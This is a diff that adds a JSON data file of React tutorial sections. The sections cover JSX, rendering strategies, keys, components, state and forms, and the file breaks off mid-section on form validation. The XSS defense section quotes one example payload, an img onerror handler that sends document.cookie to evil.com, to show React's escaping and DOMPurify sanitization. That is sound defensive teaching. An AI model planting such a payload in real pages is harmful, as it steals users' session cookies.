@@ -1,0 +1,359 @@
+[
+  {
+    "id": 1,
+    "title": "Part 1 — React Foundations & Architecture",
+    "badge": "Foundations",
+    "color": "#61dafb",
+    "sections": [
+      {
+        "id": "1.1",
+        "title": "1. What is React? Library vs Framework",
+        "content": "### 1. Topic Overview & Mental Model\nReact is an open-source, declarative JavaScript library created by Facebook (Meta) for building dynamic user interfaces out of modular, reusable components.\n\n**The Mental Model: UI as a Pure Projection of State**\nIn React, you do not write step-by-step instructions telling the browser how to manipulate HTML nodes. Instead, you declare what the UI should look like for a given state:\n\nUI = f(state)\n\nWhenever state changes, React calls your function again, calculates the minimal delta between the new virtual representation and the previous one, and updates the real DOM automatically.\n\n### 2. Library vs Framework Distinction\n- **Library (React)**: Focuses exclusively on the view layer (rendering UI, reconciliation, synthetic events, and state binding). It provides high flexibility: you choose your own routing (React Router), state management (Zustand, Redux Toolkit), data fetching (TanStack Query), and build tools (Vite).\n- **Framework (Next.js, Remix, Angular)**: Highly opinionated, providing end-to-end conventions for routing, server rendering, data loaders, bundling, and API routes.\n\n### 3. Internal Working & Engine Mechanics\nReact operates with a host-agnostic core (`react`) and platform-specific renderers:\n- **`react` package**: Defines component primitives, hooks (`useState`, `useEffect`), context, and Fiber data structures.\n- **`react-dom` package**: Translates abstract Fiber nodes into physical browser DOM elements (`HTMLDivElement`, etc.).\n- **`react-native` package**: Translates Fiber nodes into native iOS (UIKit) and Android (Android Views) widgets.",
+        "code": "// Minimal working example: Pure React without build tooling\nimport { createElement } from 'react';\nimport { createRoot } from 'react-dom/client';\n\nfunction Greeter({ name }) {\n  return createElement('h1', { className: 'hero-title' }, `Welcome to React, ${name}!`);\n}\n\nconst root = createRoot(document.getElementById('root'));\nroot.render(createElement(Greeter, { name: 'Full-Stack Engineer' }));",
+        "comparisonTable": [
+          { "aspect": "React Core Library", "detail": "Provides view logic, reconciliation, synthetic events, and hook state primitives." },
+          { "aspect": "Next.js Framework", "detail": "Provides file-system routing, Server Components, SSR/SSG/ISR, and automatic code splitting." },
+          { "aspect": "Vanilla JavaScript", "detail": "Requires manual querySelector and innerHTML mutations prone to race conditions and DOM desyncs." }
+        ],
+        "keyTakeaways": [
+          "React is officially a UI library, not an all-inclusive framework.",
+          "React core is platform-agnostic; react-dom renders to browsers, while react-native renders to mobile OS widgets.",
+          "UI = f(state) is the universal mental model of declarative frontend engineering."
+        ]
+      },
+      {
+        "id": "1.2",
+        "title": "2. Declarative vs Imperative UI Programming",
+        "content": "### 1. Concept Definition & Contrast\n- **Imperative Programming**: You manually command the computer with sequential instructions on HOW to change the UI (e.g. `document.getElementById`, `classList.add`, `removeElement`).\n- **Declarative Programming**: You declare WHAT the screen should display given current conditions, leaving the underlying DOM mutations to the engine.\n\n### 2. Historical Context & Problem Solved\nIn legacy jQuery applications, multiple event handlers mutated shared DOM nodes simultaneously. When a network response arrived after a user tab-switch, the DOM often displayed stale, corrupted data. React eliminates DOM mutation race conditions by recalculating the virtual tree from state.\n\n### 3. Step-by-Step Execution Breakdown\n1. User clicks a button.\n2. State setter updates local state variable in React Fiber.\n3. React schedules a re-render for the component subtree.\n4. Component function executes, evaluating conditional ternary operators and mapping arrays.\n5. React diffs the returned virtual element against the prior fiber.\n6. Only the changed attributes or text nodes are committed to the browser DOM.",
+        "code": "// Imperative Approach (Vanilla JS / jQuery Style):\nconst btn = document.querySelector(\"#counter-btn\");\nconst display = document.querySelector(\"#counter-val\");\nlet count = 0;\nbtn.addEventListener(\"click\", () => {\n  count++;\n  display.textContent = count; // Manual, fragile DOM write\n  if (count > 5) display.style.color = \"red\";\n});\n\n// Declarative Approach (React):\nimport { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  return (\n    <div>\n      <span style={{ color: count > 5 ? 'red' : 'white' }}>{count}</span>\n      <button onClick={() => setCount(c => c + 1)}>Increment</button>\n    </div>\n  );\n}",
+        "comparisonTable": [
+          { "aspect": "Imperative (jQuery/Vanilla)", "detail": "Manual DOM queries, explicit mutation steps, fragile state synchronization." },
+          { "aspect": "Declarative (React)", "detail": "UI declared as a pure function of state; engine handles all low-level DOM mutations." }
+        ],
+        "keyTakeaways": [
+          "Imperative code focuses on HOW to manipulate DOM nodes step-by-step.",
+          "Declarative code focuses on WHAT the interface represents for any given state.",
+          "Declarative rendering prevents state-desynchronization bugs across complex UI flows."
+        ]
+      },
+      {
+        "id": "1.3",
+        "title": "3. Rendering Strategies: SPA, CSR, SSR, SSG & Hydration",
+        "content": "### 1. Topic Overview & Architectural Definitions\nModern web architectures offer distinct rendering strategies depending on SEO, performance, and latency requirements:\n\n- **Single Page Application (SPA / CSR)**: Client receives an empty HTML shell (`<div id=\"root\"></div>`) and a large JavaScript bundle. The browser downloads and executes JS to render the entire page.\n- **Server-Side Rendering (SSR)**: The server renders the React component tree to HTML strings on each incoming HTTP request (`renderToString`). The user gets instant content, but the page is non-interactive until JS loads.\n- **Static Site Generation (SSG)**: HTML is pre-rendered at build time. Ideal for marketing pages, documentation, and blogs.\n- **Hydration**: The client-side process where React attaches event listeners, initializes state, and binds virtual Fiber nodes to pre-existing server-rendered HTML.\n\n### 2. Hydration Internal Flow & Mechanics\n1. **Server Phase**: Node.js calls `renderToPipeableStream()` or `renderToString()`. Outputs static HTML tags.\n2. **Transfer Phase**: Browser parses and renders the static HTML immediately (First Contentful Paint).\n3. **Client Phase**: Browser downloads client JS bundles. React calls `hydrateRoot(container, <App />)`.\n4. **Fiber Alignment**: React reconciles the client virtual DOM against the existing server HTML nodes without recreating them.\n5. **Hydration Mismatch Trap**: If the client renders different markup (e.g. using `window.innerWidth` or `new Date()`), React throws a hydration mismatch error and is forced to discard the server DOM!",
+        "code": "// Entry point comparison:\n\n// Client-Side Rendering (CSR / Vite standard):\nimport { createRoot } from 'react-dom/client';\nimport App from './App';\nconst root = createRoot(document.getElementById('root'));\nroot.render(<App />);\n\n// Hydration of Server-Rendered HTML (SSR / Next.js under the hood):\nimport { hydrateRoot } from 'react-dom/client';\nimport App from './App';\nhydrateRoot(document.getElementById('root'), <App />);",
+        "comparisonTable": [
+          { "aspect": "CSR (SPA)", "detail": "Fast subsequent client navigations; slow initial load (large JS bundle); poor initial SEO without pre-rendering." },
+          { "aspect": "SSR (Server-Side)", "detail": "Instant First Contentful Paint; excellent dynamic SEO; higher server compute cost per request." },
+          { "aspect": "SSG (Static Site)", "detail": "Lightning fast TTFB via CDN edge caching; requires full rebuild or ISR when content updates." },
+          { "aspect": "Hydration", "detail": "Attaches event listeners to server HTML; prone to mismatches if dates/random IDs differ between server and client." }
+        ],
+        "keyTakeaways": [
+          "Hydration connects client-side event handlers and Fiber nodes to server-generated HTML.",
+          "Never render browser-specific values (e.g., localStorage, window.innerWidth) during initial SSR render.",
+          "React 18 streaming SSR allows progressive hydration via <Suspense>."
+        ]
+      },
+      {
+        "id": "1.4",
+        "title": "4. Build Tooling: Vite vs Create-React-App vs Next.js",
+        "content": "### 1. The Build Tooling Ecosystem\nReact source code uses JSX and modern ECMAScript features that web browsers cannot parse natively. A build tool compiles, bundles, and serves this code.\n\n- **Create-React-App (CRA)**: Legacy tool based on Webpack 4/5. Bundles the entire project in memory before serving, leading to 30–90s cold start times in large codebases. Deprecated by the React team.\n- **Vite (Rollup + Esbuild)**: Modern default for SPAs. Uses native browser ES Modules (ESM) during local development. Cold starts take under 300ms regardless of project size because Vite only transforms modules requested by the browser.\n- **Next.js (Turbopack / Webpack)**: Full-stack hybrid framework with built-in server runtime, server actions, route handlers, and image optimization.\n\n### 2. Package.json Script Standards\n- `npm run dev`: Launches local Vite dev server with Hot Module Replacement (HMR).\n- `npm run build`: Runs `tsc -b` for type-checking followed by `vite build` generating minified ESM assets in `dist/`.\n- `npm run preview`: Spins up a local production web server to test production build artifacts.",
+        "code": "// vite.config.js - High-performance modern setup\nimport { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\n\nexport default defineConfig({\n  plugins: [react()],\n  server: {\n    port: 5173,\n    open: true,\n  },\n  build: {\n    target: 'esnext',\n    sourcemap: true,\n  }\n});",
+        "keyTakeaways": [
+          "Vite is the modern industry standard for client-rendered React applications.",
+          "Vite leverages native browser ESM during development and Rollup for production bundling.",
+          "Avoid CRA in modern production; use Vite for SPAs or Next.js for full-stack applications."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 2,
+    "title": "Part 2 — JSX & Rendering Fundamentals",
+    "badge": "Syntax & Rendering",
+    "color": "#38bdf8",
+    "sections": [
+      {
+        "id": "2.1",
+        "title": "5. JSX Transformation & Automatic Runtime",
+        "content": "### 1. What is JSX?\nJSX (JavaScript XML) is a syntax extension for JavaScript that allows you to write HTML-like markup directly inside JavaScript files. It is not HTML; it is compiled into pure JavaScript function calls.\n\n### 2. React 17+ Automatic JSX Runtime\nBefore React 17, every JSX file required `import React from 'react'` because JSX compiled to `React.createElement()`.\nWith the modern JSX transform (React 17, 18, 19):\n- The compiler automatically imports `_jsx` from `react/jsx-runtime`.\n- Performance is improved: `_jsx` does not perform unnecessary property validation checks that `createElement` performed.",
+        "code": "// What you write (JSX):\nconst card = (\n  <article className=\"user-card\" id=\"card-101\">\n    <h3>Alex Developer</h3>\n    <p>Senior Frontend Engineer</p>\n  </article>\n);\n\n// What the compiler produces (Modern React 17+ JSX Runtime):\nimport { jsx as _jsx, jsxs as _jsxs } from \"react/jsx-runtime\";\n\nconst card = _jsxs(\"article\", {\n  className: \"user-card\",\n  id: \"card-101\",\n  children: [\n    _jsx(\"h3\", { children: \"Alex Developer\" }),\n    _jsx(\"p\", { children: \"Senior Frontend Engineer\" })\n  ]\n});",
+        "comparisonTable": [
+          { "aspect": "JSX Syntax", "detail": "HTML-like syntax inside JS; requires camelCase properties (className, htmlFor, onClick)." },
+          { "aspect": "Compiled Output", "detail": "Pure JavaScript objects (React Elements) with $$typeof: Symbol(react.element)." },
+          { "aspect": "HTML", "detail": "Native browser markup parser; accepts lowercase attribute names (class, for, onclick)." }
+        ],
+        "keyTakeaways": [
+          "JSX compiles down to JavaScript function calls returning React Element objects.",
+          "React 17+ does not require manual 'import React from react' for JSX compilation.",
+          "All JSX tags must close explicitly (<img />, <input />)."
+        ]
+      },
+      {
+        "id": "2.2",
+        "title": "6. Value Rendering Rules & The Zero Trap",
+        "content": "### 1. How React Renders JavaScript Expressions\nInside JSX curly braces `{expression}`, React evaluates types differently:\n- **Strings and Numbers**: Render directly to DOM text nodes (`{\"Hello\"} {42}` renders `Hello 42`).\n- **Booleans (`true` / `false`), `null`, `undefined`**: Render NOTHING (empty slot). This is deliberate to allow clean conditional rendering: `{isLoggedIn && <Dashboard />}`.\n- **Arrays**: Render each child element sequentially in place.\n- **Plain Objects**: Throw runtime error: `Objects are not valid as a React child`! Must access specific properties (`{user.name}`).\n\n### 2. The Dangerous 'Zero Trap' (`0 && <Component />`)\nWhen using the logical AND (`&&`) operator, JavaScript evaluates the left operand. If the left operand is falsy, JS returns that operand value directly!\n- If `items.length` is `0`: `items.length && <List />` evaluates to `0`!\n- React sees the number `0`, and because numbers are valid renderable content, it prints the literal digit `0` to the UI!",
+        "code": "function ShoppingCartBadge({ items }) {\n  // ❌ THE ZERO BUG: When items is empty, this renders the number \"0\" onto the screen!\n  // return <div>{items.length && <Badge count={items.length} />}</div>;\n\n  // ✅ FIX 1: Explicit boolean comparison\n  // return <div>{items.length > 0 && <Badge count={items.length} />}</div>;\n\n  // ✅ FIX 2: Double negation / Boolean conversion\n  // return <div>{Boolean(items.length) && <Badge count={items.length} />}</div>;\n\n  // ✅ FIX 3: Explicit ternary operator (Senior preferred)\n  return (\n    <div>\n      {items.length > 0 ? <Badge count={items.length} /> : null}\n    </div>\n  );\n}",
+        "keyTakeaways": [
+          "Booleans, null, and undefined produce zero rendered DOM output.",
+          "The number 0 is falsy in JavaScript, but valid text in React! Never write: count && <Component />.",
+          "Always write count > 0 && <Component /> or use explicit ternary expressions."
+        ]
+      },
+      {
+        "id": "2.3",
+        "title": "7. XSS Defense & dangerouslySetInnerHTML",
+        "content": "### 1. Cross-Site Scripting (XSS) Prevention\nBy default, React escapes all strings rendered within JSX expressions before inserting them into the DOM.\nIf a malicious user submits:\n```html\n<img src=\"x\" onerror=\"fetch('https://evil.com/steal?cookie=' + document.cookie)\" />\n```\nReact converts it into plain text strings (`&lt;img src=&quot;x&quot;...&gt;`). The browser renders the raw text rather than executing the JavaScript payload.\n\n### 2. dangerouslySetInnerHTML & Sanitization\nWhen you must render raw HTML (e.g. from a rich-text CMS like Strapi or Sanity), React forces you to write `dangerouslySetInnerHTML={{ __html: sanitizedContent }}`.\n**Rule**: NEVER pass un-sanitized user strings into `dangerouslySetInnerHTML`. Always sanitize with **DOMPurify**!",
+        "code": "import DOMPurify from 'dompurify';\n\nfunction SafeHtmlViewer({ untrustedCmsHtml }) {\n  // Sanitize the HTML string to strip malicious <script> tags and onerror attributes\n  const cleanHtml = DOMPurify.sanitize(untrustedCmsHtml, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'h1', 'h2'],\n    ALLOWED_ATTR: ['href', 'target', 'rel']\n  });\n\n  return (\n    <div\n      className=\"cms-content-wrapper\"\n      dangerouslySetInnerHTML={{ __html: cleanHtml }}\n    />\n  );\n}",
+        "keyTakeaways": [
+          "React automatically escapes strings in JSX to protect against XSS attacks.",
+          "dangerouslySetInnerHTML explicitly opts out of React's escaping mechanism.",
+          "Always sanitize raw HTML with DOMPurify before feeding it to dangerouslySetInnerHTML."
+        ]
+      },
+      {
+        "id": "2.4",
+        "title": "8. Lists, Keys & Reconciliation Hazards",
+        "content": "### 1. Why React Requires Keys\nWhen rendering an array of elements, React requires a unique `key` prop on each element.\nKeys give React a stable identity for each node across render cycles. During reconciliation, React matches new elements with old ones using their `key` and element `type`.\n\n### 2. Why Array Index as Key is Dangerous\nIf you use the array index as the key (`key={index}`):\n1. **Reordering or Filtering**: If an item is prepended or deleted, every subsequent item's index shifts (item at index 1 becomes index 0).\n2. **State Leakage**: Uncontrolled input state, checkbox checks, or active animations remain attached to the DOM node at index 0 rather than moving with the data record!",
+        "code": "// ❌ DANGEROUS: Index as key breaks state when deleting or sorting\nfunction TodoListBad({ todos, onDelete }) {\n  return (\n    <ul>\n      {todos.map((todo, index) => (\n        <li key={index}>\n          <input type=\"checkbox\" /> {/* Checkbox state leaks to next item on delete! */}\n          <span>{todo.text}</span>\n          <button onClick={() => onDelete(index)}>Delete</button>\n        </li>\n      ))}\n    </ul>\n  );\n}\n\n// ✅ PRODUCTION GRADE: Stable unique entity ID as key\nfunction TodoListGood({ todos, onDelete }) {\n  return (\n    <ul>\n      {todos.map(todo => (\n        <li key={todo.id}>\n          <input type=\"checkbox\" />\n          <span>{todo.text}</span>\n          <button onClick={() => onDelete(todo.id)}>Delete</button>\n        </li>\n      ))}\n    </ul>\n  );\n}",
+        "keyTakeaways": [
+          "Keys provide a persistent identity that survives re-ordering, deletion, and insertion.",
+          "Using array indices as keys causes state corruption in stateful child components and inputs.",
+          "Always use stable, unique database IDs or crypto.randomUUID() generated at data creation."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 3,
+    "title": "Part 3 — Components & Composition",
+    "badge": "Architecture",
+    "color": "#a855f7",
+    "sections": [
+      {
+        "id": "3.1",
+        "title": "9. Function Components & Props Immutability",
+        "content": "### 1. Function Components & Single Responsibility\nIn modern React, components are JavaScript functions that accept a single `props` object and return React Elements.\n**Rules of Components**:\n- Name must start with a Capital letter (`<UserCard />` vs `<div />`).\n- Must be a **pure function** with respect to its props: given identical props, it must return identical JSX without mutating outside variables.\n\n### 2. Golden Rule: Props are Strictly Read-Only\nA child component must **NEVER mutate its received props directly**.\n```javascript\n// ❌ CRITICAL BUG: Mutating received props\nfunction PriceDisplay(props) {\n  props.amount = props.amount * 1.1; // MUTATION! Destroys parent state!\n  return <span>${props.amount}</span>;\n}\n```\nIf a child needs to modify data, the parent must pass down an updater callback function!",
+        "code": "// ✅ Clean Component with Props Destructuring & Default Values\nfunction MetricCard({ title, value, unit = 'ms', trend = 0, onRefresh }) {\n  return (\n    <div className=\"metric-card\">\n      <span className=\"metric-title\">{title}</span>\n      <div className=\"metric-value\">\n        {value} <small>{unit}</small>\n      </div>\n      <div className={`metric-trend ${trend >= 0 ? 'positive' : 'negative'}`}>\n        {trend >= 0 ? '▲' : '▼'} {Math.abs(trend)}%\n      </div>\n      {onRefresh && (\n        <button onClick={onRefresh} className=\"refresh-btn\">Refresh</button>\n      )}\n    </div>\n  );\n}",
+        "keyTakeaways": [
+          "Props are read-only snapshot values owned by the parent component.",
+          "Never mutate props in-place; always invoke callback functions to request changes from the parent.",
+          "Use default parameter syntax for clean fallback prop values."
+        ]
+      },
+      {
+        "id": "3.2",
+        "title": "10. Component Composition vs Inheritance",
+        "content": "### 1. Why Composition Wins Over Inheritance\nReact has never recommended object-oriented class inheritance for code reuse. Instead, it relies on **Composition**: assembling complex features by nesting specialized components inside container components via the `children` prop.\n\n### 2. Containment and the `children` Prop\nThe `children` prop allows components to act as generic layout shells (Cards, Modals, Drawers, Sidebars) without knowing what specific content will be placed inside them in advance.",
+        "code": "// Container / Shell Component\nfunction ModalDialog({ isOpen, title, onClose, children, footerActions }) {\n  if (!isOpen) return null;\n\n  return (\n    <div className=\"modal-backdrop\" onClick={onClose}>\n      <div className=\"modal-surface\" onClick={e => e.stopPropagation()}>\n        <header className=\"modal-header\">\n          <h3>{title}</h3>\n          <button onClick={onClose} aria-label=\"Close dialog\">×</button>\n        </header>\n        <section className=\"modal-body\">\n          {children} {/* Transcluded dynamic content */}\n        </section>\n        {footerActions && (\n          <footer className=\"modal-footer\">{footerActions}</footer>\n        )}\n      </div>\n    </div>\n  );\n}",
+        "keyTakeaways": [
+          "React components favor composition over class inheritance.",
+          "The children prop allows components to accept arbitrary nested JSX trees.",
+          "Specialized props (e.g. footerActions={<Button />}) allow slot-based layout composition."
+        ]
+      },
+      {
+        "id": "3.3",
+        "title": "11. Compound Components Pattern",
+        "content": "### 1. What is the Compound Component Pattern?\nCompound Components are components that work together to share implicit state and form a cohesive UI unit (e.g. `<Select>` and `<Select.Option>`, `<Tabs>` and `<Tabs.Tab>`).\nInstead of passing 20 configuration props into a single monolithic component, compound components allow the consumer to declare layout and structure flexibly.\n\n### 2. Internal Implementation via Context\nA parent wrapper manages state (e.g. `activeTabId`) and provides it via a React Context. Subcomponents consume this context implicitly.",
+        "code": "import React, { useState, createContext, useContext } from 'react';\n\nconst TabsContext = createContext(null);\n\nexport function Tabs({ defaultTab, children }) {\n  const [activeTab, setActiveTab] = useState(defaultTab);\n  return (\n    <TabsContext.Provider value={{ activeTab, setActiveTab }}>\n      <div className=\"tabs-container\">{children}</div>\n    </TabsContext.Provider>\n  );\n}\n\nTabs.List = function TabList({ children }) {\n  return <div className=\"tab-buttons-bar\" role=\"tablist\">{children}</div>;\n};\n\nTabs.Trigger = function TabTrigger({ value, children }) {\n  const { activeTab, setActiveTab } = useContext(TabsContext);\n  const isSelected = activeTab === value;\n  return (\n    <button\n      role=\"tab\"\n      aria-selected={isSelected}\n      className={isSelected ? 'tab-trigger active' : 'tab-trigger'}\n      onClick={() => setActiveTab(value)}\n    >\n      {children}\n    </button>\n  );\n};\n\nTabs.Content = function TabContent({ value, children }) {\n  const { activeTab } = useContext(TabsContext);\n  if (activeTab !== value) return null;\n  return <div role=\"tabpanel\" className=\"tab-panel\">{children}</div>;\n};",
+        "keyTakeaways": [
+          "Compound components share state implicitly via React Context.",
+          "Provides an expressive, highly declarative API for complex UI widgets like Tabs, Accordions, and Menus.",
+          "Eliminates prop drilling while preserving customizable markup flexibility."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 4,
+    "title": "Part 4 — State & Rendering Mechanics",
+    "badge": "State Management",
+    "color": "#c084fc",
+    "sections": [
+      {
+        "id": "4.1",
+        "title": "12. State as a Snapshot & Automatic Batching",
+        "content": "### 1. Mental Model: State is a Snapshot\nCalling `setCount(count + 1)` does NOT mutate the local variable `count` in place.\nInstead, state behaves like a snapshot of time:\n- When React renders a component, it passes the state snapshot for that specific render.\n- Within event handlers and effect callbacks of that render, the variable `count` remains completely constant, even if you call `setCount` multiple times!\n\n### 2. Automatic Batching (React 18 & 19)\nBatching is React's mechanism of grouping multiple state updates into a single render pass to prevent unnecessary intermediary DOM repaints.\n- **React 17**: Only batched updates inside native React event handlers. Updates inside `setTimeout`, Promises, or fetch callbacks caused separate re-renders.\n- **React 18+**: Automatically batches ALL state updates everywhere, including async promises, timeouts, and native DOM event listeners!",
+        "code": "import { useState } from 'react';\n\nfunction BatchingDemo() {\n  const [count, setCount] = useState(0);\n\n  function handleDirectIncrements() {\n    // ❌ WRONG: each uses the snapshot count (0)\n    // setCount(count + 1); // queues: next = 0 + 1\n    // setCount(count + 1); // queues: next = 0 + 1\n    // setCount(count + 1); // queues: next = 0 + 1\n    // Result: count becomes 1, NOT 3!\n\n    // ✅ CORRECT: Functional updates receive the pending state queue\n    setCount(prev => prev + 1); // 0 -> 1\n    setCount(prev => prev + 1); // 1 -> 2\n    setCount(prev => prev + 1); // 2 -> 3\n    // Result: count becomes 3!\n  }\n\n  return <button onClick={handleDirectIncrements}>Count: {count}</button>;\n}",
+        "comparisonTable": [
+          { "aspect": "Direct State Update (setState(val))", "detail": "Overwrites queued state with snapshot value; multiple calls in same tick overwrite each other." },
+          { "aspect": "Functional State Update (setState(prev => val))", "detail": "Queues updater function executed sequentially against previous queued state; safe for chained updates." }
+        ],
+        "keyTakeaways": [
+          "State variables do not change in-place during the execution of an active render frame.",
+          "Use functional updates (prev => prev + 1) whenever the next state depends on the previous state.",
+          "React 18+ batches all state updates across async ticks and timers automatically."
+        ]
+      },
+      {
+        "id": "4.2",
+        "title": "13. Immutable State Updates (Objects & Arrays)",
+        "content": "### 1. Why Mutation Breaks React\nReact determines whether a component needs to re-render by comparing the old state reference with the new state reference using `Object.is(oldState, newState)`.\nIf you mutate an object in place:\n```javascript\nuser.profile.bio = \"Senior SDE\"; // MUTATION!\nsetUser(user); // Object.is(user, user) is TRUE -> React skips re-rendering!\n```\n\n### 2. The Golden Rule of Immutable Updates\nAlways produce a **brand new object or array reference** containing shallow copies of unchanged properties and updated values for target fields.",
+        "code": "// Updating nested object state immutably:\nsetUser(prevUser => ({\n  ...prevUser,\n  profile: {\n    ...prevUser.profile,\n    bio: \"Senior Full Stack Architect\",\n    skills: [...prevUser.profile.skills, \"React 19\"]\n  }\n}));\n\n// Immutable Array Operations:\n// 1. Append Item:\nsetItems(prev => [...prev, newItem]);\n\n// 2. Remove Item by ID:\nsetItems(prev => prev.filter(item => item.id !== targetId));\n\n// 3. Update Item by ID:\nsetItems(prev => prev.map(item => \n  item.id === targetId ? { ...item, quantity: item.quantity + 1 } : item\n));\n\n// 4. Insert at specific index:\nsetItems(prev => [\n  ...prev.slice(0, insertIndex),\n  newItem,\n  ...prev.slice(insertIndex)\n]);",
+        "keyTakeaways": [
+          "Never mutate state directly (e.g. user.name = 'x' or array.push(x)).",
+          "React checks for changes via Object.is referential equality.",
+          "Use object spread ({ ...prev }) and array methods like filter(), map(), and slice() that return new references."
+        ]
+      },
+      {
+        "id": "4.3",
+        "title": "14. Derived State vs Redundant State",
+        "content": "### 1. The Redundant State Anti-Pattern\nA frequent mistake is creating new `useState` variables for values that can be computed from existing props or state.\nRedundant state leads to state-desynchronization bugs where one value updates but its duplicate remains stale.\n\n### 2. The Golden Rule of Derived State\n**If a value can be computed or calculated from existing props or state, DO NOT put it in state!** Compute it directly during render.",
+        "code": "// ❌ BAD: Redundant state sync trap\nfunction CartBad({ items }) {\n  const [total, setTotal] = useState(0);\n\n  // Unnecessary Effect required just to keep total in sync!\n  useEffect(() => {\n    setTotal(items.reduce((sum, item) => sum + item.price * item.quantity, 0));\n  }, [items]);\n\n  return <div>Total: ${total}</div>;\n}\n\n// ✅ CLEAN & PRODUCTION GRADE: Derived state calculated inline during render\nfunction CartGood({ items }) {\n  // Pure inline calculation: always 100% synchronized, zero extra re-renders!\n  const total = items.reduce((sum, item) => sum + item.price * item.quantity, 0);\n\n  return <div>Total: ${total}</div>;\n}",
+        "keyTakeaways": [
+          "Never store computed values in state if they can be calculated from existing props or state.",
+          "Derived state eliminates redundant useEffect synchronizations and guarantees 100% sync consistency.",
+          "If the calculation is computationally expensive (e.g. filtering 10,000 items), wrap it in useMemo."
+        ]
+      },
+      {
+        "id": "4.4",
+        "title": "15. Resetting State with the Key Prop",
+        "content": "### 1. Component Identity & Position in the Tree\nReact associates state with a specific component instance based on its **position in the JSX element hierarchy**.\nIf a component stays at the same position in the tree between renders, React preserves its state.\n\n### 2. Force State Reset via the `key` Prop\nWhen you change an element's `key`, React treats it as a brand-new component:\n1. It unmounts the old component instance (running effect cleanups).\n2. It destroys the old state completely.\n3. It mounts a fresh component instance with initialized default state.",
+        "code": "// Resetting form state when switching users:\nfunction UserAdminView({ currentUserId }) {\n  // By passing currentUserId as the key, React automatically resets all internal\n  // form state (inputs, draft text, validation errors) when the user changes!\n  return <UserProfileEditor key={currentUserId} userId={currentUserId} />;\n}",
+        "keyTakeaways": [
+          "React preserves state as long as a component remains at the same position in the UI tree.",
+          "Changing the 'key' prop completely unmounts the old instance and resets all internal state cleanly.",
+          "This pattern avoids messy useEffect reset logic inside form components."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 5,
+    "title": "Part 5 — Events, Synthetic Events & Forms",
+    "badge": "Events & Forms",
+    "color": "#e879f9",
+    "sections": [
+      {
+        "id": "5.1",
+        "title": "16. SyntheticEvents & Modern Event Delegation",
+        "content": "### 1. What is a SyntheticEvent?\nA `SyntheticEvent` is React's cross-browser wrapper around the browser's native DOM event. It provides an identical API across Chrome, Safari, Firefox, and Edge while adhering to the W3C spec.\n\n### 2. Event Delegation Mechanics (React 17+)\n- **React 16 and older**: React attached a single global event listener to `document` for all events.\n- **React 17, 18, 19**: React attaches event listeners to the **root DOM container** (`<div id=\"root\">`) where `createRoot()` is mounted. This allows multiple isolated React applications or micro-frontends to co-exist on the same page without cross-contaminating event bubbling.",
+        "code": "function SearchInput({ onSearch }) {\n  function handleKeyDown(e) {\n    // Access native browser event if needed:\n    console.log(\"Native Event:\", e.nativeEvent);\n\n    // SyntheticEvent methods:\n    if (e.key === 'Enter') {\n      e.preventDefault(); // Prevents standard form submission\n      e.stopPropagation(); // Stops bubbling up the React component tree\n      onSearch(e.target.value);\n    }\n  }\n\n  return <input type=\"text\" onKeyDown={handleKeyDown} placeholder=\"Search...\" />;\n}",
+        "comparisonTable": [
+          { "aspect": "SyntheticEvent", "detail": "Normalized cross-browser wrapper; bubbles through the React Virtual DOM hierarchy." },
+          { "aspect": "Native Event (e.nativeEvent)", "detail": "Underlying browser DOM event; bubbles through physical HTML DOM nodes." }
+        ],
+        "keyTakeaways": [
+          "React wraps native browser events in SyntheticEvent for consistent cross-browser behavior.",
+          "Since React 17, events are attached to the root DOM container (#root), not document.",
+          "e.stopPropagation() prevents the event from bubbling up the React component tree."
+        ]
+      },
+      {
+        "id": "5.2",
+        "title": "17. Controlled vs Uncontrolled Inputs",
+        "content": "### 1. Conceptual Distinction\n- **Controlled Components**: The input's visual value is driven directly by React state (`value={text}`). Every keystroke triggers an `onChange` event that updates state. React is the single source of truth.\n- **Uncontrolled Components**: The input maintains its own internal DOM state. You read its value on-demand using a `useRef()` or `FormData` API upon form submission.\n\n### 2. Architectural Trade-offs\n- Use **Controlled** when you need instant inline validation, dynamic masking (e.g. credit card formatting), or disabling buttons based on character count.\n- Use **Uncontrolled** for huge dynamic forms (50+ fields) where re-rendering on every keystroke causes frame drops, or when integrating with non-React libraries.",
+        "code": "import { useState, useRef } from 'react';\n\n// Controlled Input (React owns the value):\nfunction ControlledInput() {\n  const [email, setEmail] = useState('');\n  return (\n    <div>\n      <input\n        value={email}\n        onChange={e => setEmail(e.target.value.toLowerCase())}\n        placeholder=\"Controlled input\"\n      />\n      {email && !email.includes('@') && <p className=\"error\">Invalid email</p>}\n    </div>\n  );\n}\n\n// Uncontrolled Input (DOM owns the value; read via ref):\nfunction UncontrolledInput() {\n  const fileInputRef = useRef(null);\n\n  function handleSubmit(e) {\n    e.preventDefault();\n    const uploadedFile = fileInputRef.current.files[0];\n    console.log(\"File name:\", uploadedFile?.name);\n  }\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <input type=\"file\" ref={fileInputRef} />\n      <button type=\"submit\">Upload</button>\n    </form>\n  );\n}",
+        "comparisonTable": [
+          { "aspect": "Controlled Input", "detail": "State-driven (value + onChange); immediate validation; re-renders on keystroke." },
+          { "aspect": "Uncontrolled Input", "detail": "DOM-driven (ref / defaultValue); zero re-renders on keystroke; queried on submit." }
+        ],
+        "keyTakeaways": [
+          "Controlled components keep input values in React state for immediate validation.",
+          "File inputs (<input type='file' />) are always uncontrolled because their values are read-only in the browser.",
+          "Uncontrolled inputs improve rendering performance in massive forms with dozens of fields."
+        ]
+      },
+      {
+        "id": "5.3",
+        "title": "18. Production Form Architecture with Validation",
+        "content": "### 1. Form Validation Architecture\nIn production systems (e.g. Chrona task creation, LesHub checkout), forms require:\n1. Multi-field state handling without 20 separate `useState` hooks.\n2. Synchronous & asynchronous validation rules.\n3. Field touch tracking (`touched`) so error messages don't scream at users before they finish typing.\n4. Loading and error states during submission.",
